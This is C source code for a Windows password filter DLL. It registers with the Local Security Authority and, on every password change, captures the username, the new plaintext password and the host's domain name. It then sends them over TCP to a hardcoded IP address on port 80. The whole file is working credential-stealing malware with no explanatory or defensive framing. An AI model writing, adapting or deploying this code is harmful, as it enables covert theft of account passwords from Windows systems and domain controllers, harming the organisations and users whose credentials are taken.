#define DEST_IP "192.168.150.217"
#define DEST_PORT 80

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <ntsecapi.h>
#include <stdio.h>

char * getFQDN(void)
{
	char * fqdn = malloc(sizeof(char) * 50);
	strcpy(fqdn, gethostbyname("")->h_name); 
	return fqdn;
}

void sendCreds(PUNICODE_STRING UserName, PUNICODE_STRING NewPassword)
{
	char username[50];
	char password[50];
	char * fqdn = getFQDN();
	char buffer[200];
	
	// convert username and password to normal string format
	wcstombs(username, UserName->Buffer, sizeof(username));
	wcstombs(password, NewPassword->Buffer, sizeof(password));
	// place all info into one buffer
	snprintf(buffer, 200, "%s\n%s\n%s", fqdn, username, password);
	
	// set up socket
	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(DEST_IP);
	server.sin_port = htons(DEST_PORT);
	
	// connect to server and send buffer
	connect(s, (struct sockaddr *)&server, sizeof(server));
	send(s, buffer, sizeof(char)*strlen(buffer), 0);
	
	// close socket
	shutdown(s, SD_BOTH);
	free(fqdn);
}

__declspec(dllexport) 
BOOLEAN WINAPI InitializeChangeNotify(void)
{ 
	return TRUE;
}

__declspec(dllexport)
NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeID, PUNICODE_STRING NewPassword)
{
	sendCreds(UserName, NewPassword);
	return TRUE;
}

__declspec(dllexport)
BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation)
{
	return TRUE;
}
